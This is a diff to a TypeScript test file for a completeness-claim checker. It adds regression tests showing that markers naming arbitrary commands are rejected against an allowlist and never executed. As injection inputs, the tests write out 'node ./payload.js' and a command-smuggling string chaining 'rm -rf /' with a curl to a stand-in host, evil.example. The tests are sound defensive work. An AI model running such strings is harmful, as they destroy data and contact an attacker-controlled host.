@@ -7,29 +7,40 @@ function fakeRunner(stdout: string): Runner {
   return () => Promise.resolve({ stdout, stderr: "", code: 0 });
 }
 
+/** A runner that records every call it receives and fails the test if invoked — used to prove a
+ * disallowed `cmd=` name is never executed, not just that its result is discarded. */
+function spyRunnerThatMustNotBeCalled(): { runner: Runner; calls: unknown[] } {
+  const calls: unknown[] = [];
+  const runner: Runner = (cmd, args, opts) => {
+    calls.push({ cmd, args, opts });
+    return Promise.resolve({ stdout: "", stderr: "", code: 0 });
+  };
+  return { runner, calls };
+}
+
 test("QA-15: no claims -> vacuous pass", async () => {
   const result = await checkCompleteness("plain prose, no numbers claimed as complete", fakeRunner(""));
   assert.equal(result.ok, true);
   assert.equal(result.vacuous, true);
 });
 
-test("QA-15: parses a marker claim's cmd and expect", () => {
-  const claims = findMarkerClaims('All good: [[completeness: cmd="node count.mjs" expect=35]]');
+test("QA-15: parses a marker claim's cmd (symbolic instrument name) and expect", () => {
+  const claims = findMarkerClaims('All good: [[completeness: cmd="adr-cache-ensure" expect=35]]');
   assert.equal(claims.length, 1);
-  assert.equal(claims[0]?.cmd, "node count.mjs");
+  assert.equal(claims[0]?.cmd, "adr-cache-ensure");
   assert.equal(claims[0]?.expect, 35);
 });
 
 test("QA-15: instrument re-run matches claim -> pass", async () => {
   const result = await verifyMarkerClaim(
-    { raw: "x", cmd: "count", expect: 35 },
+    { raw: "x", cmd: "adr-cache-ensure", expect: 35 },
     fakeRunner("counted 35 items"),
   );
   assert.equal(result.ok, true);
 });
 
 test("QA-15: instrument re-run produces a DIFFERENT number -> FAIL naming both (the exact defect this closes)", async () => {
-  const text = 'All 35 ADRs reviewed. [[completeness: cmd="node docs/adr-cache.mjs --count" expect=35]]';
+  const text = 'All 35 ADRs reviewed. [[completeness: cmd="adr-cache-ensure" expect=35]]';
   const result = await checkCompleteness(text, fakeRunner("the instrument reports: 44 of 37"));
   assert.equal(result.ok, false);
   assert.match(result.details.join("\n"), /says 35/);
@@ -37,10 +48,28 @@ test("QA-15: instrument re-run produces a DIFFERENT number -> FAIL naming both (
 });
 
 test("QA-15: instrument produces no parseable number -> FAIL", async () => {
-  const text = '[[completeness: cmd="node whatever.mjs" expect=5]]';
+  const text = '[[completeness: cmd="adr-cache-ensure" expect=5]]';
   const result = await checkCompleteness(text, fakeRunner("no numbers here"));
   assert.equal(result.ok, false);
   assert.match(result.details.join("\n"), /no parseable number/);
+});
+
+test("QA-15 (regression, app-security HIGH — Issue #57): a crafted marker naming an arbitrary command is REJECTED, never executed, not silently skipped", async () => {
+  const { runner, calls } = spyRunnerThatMustNotBeCalled();
+  const maliciousText = 'Progress: [[completeness: cmd="node ./payload.js" expect=0]]';
+  const result = await checkCompleteness(maliciousText, runner);
+  assert.equal(calls.length, 0, "the runner must never be invoked for a cmd= not on the allowlist");
+  assert.equal(result.ok, false, "an unknown instrument name must fail closed, not silently pass");
+  assert.match(result.details.join("\n"), /not on the fixed completeness-instrument allowlist/);
+  assert.match(result.details.join("\n"), /never executed/);
+});
+
+test("QA-15 (regression): a shell-metacharacter-laden cmd= is still just looked up by name, not interpreted", async () => {
+  const { runner, calls } = spyRunnerThatMustNotBeCalled();
+  const maliciousText = 'Done: [[completeness: cmd="rm -rf / ; curl evil.example" expect=1]]';
+  const result = await checkCompleteness(maliciousText, runner);
+  assert.equal(calls.length, 0);
+  assert.equal(result.ok, false);
 });
 
 test("QA-15: a bare numeric completeness claim with no marker -> FAIL (no machine-readable instrument reference)", () => {
@@ -55,7 +84,7 @@ test("QA-15: bare claim end-to-end FAILS the gate", async () => {
 });
 
 test("QA-15: a claim WITH a marker on the same line is not double-flagged as bare", async () => {
-  const text = 'All 35 ADRs reviewed. [[completeness: cmd="count" expect=35]]';
+  const text = 'All 35 ADRs reviewed. [[completeness: cmd="adr-cache-ensure" expect=35]]';
   const result = await checkCompleteness(text, fakeRunner("35"));
   assert.equal(result.ok, true, result.details.join("\n"));
 });
